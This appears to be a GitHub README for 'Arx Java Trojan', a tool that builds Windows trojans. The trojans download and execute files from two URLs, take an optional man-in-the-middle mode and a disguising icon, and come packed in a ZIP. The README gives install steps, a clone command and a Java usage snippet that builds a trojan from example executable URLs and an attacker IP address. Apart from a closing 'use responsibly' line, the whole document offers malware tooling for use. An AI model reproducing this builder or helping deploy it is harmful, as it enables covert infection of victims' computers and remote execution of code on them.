# Arx Java Trojan

- This project is designed to create a Trojan software that can download and execute files from specified URLs. 
- It is developed in Java and compiled to run in a Windows environment using AutoIt.

## Features

- Ability to download and execute files from two URLs.
- Optional creation of a temporary file for man-in-the-middle (MITM) attacks.
- Icon customization feature to add a specific icon to the compiled file.
- Packaging of the generated file into a ZIP archive.

## Requirements

- Java JDK
- [Wine](https://www.winehq.org/) (to run Windows applications)
- [AutoIt](https://www.autoitscript.com/site/autoit/downloads/) and the `Aut2exe` tool

## Installation

1. **Install Requirements:**
   - Install Java JDK and Wine on your system.
   - Download and install AutoIt, noting the path to `Aut2exe`.

2. **Clone the Project:**
   ```bash
   git clone https://github.com/cyze-afresh/Arx-Java-Trojan/

3. **Prepare Necessary Files:**
   Place the appropriate icon files in the icons directory.



# Usage

You can use the Trojan class to create a Trojan. Below is an example:

`
Trojan trojan = new Trojan("http://example.com/file1.exe", "http://example.com/file2.exe", "path/to/icon.ico", "outputFile.exe", "your.ip.address");
trojan.create(true); // Set to true for MITM mode
trojan.compile(); // Compile the AutoIt code
trojan.zip("outputFile.exe"); // Create a ZIP archive
`
# Notes

Ensure that you have permission to download and execute files from the specified URLs.

Use this project responsibly and in compliance with applicable laws and regulations.

# Contribution
I would like to thank my friend Rovaniq for contributing to this project.

Feel free to contribute to the project by submitting issues or pull requests. All contributions are welcome!

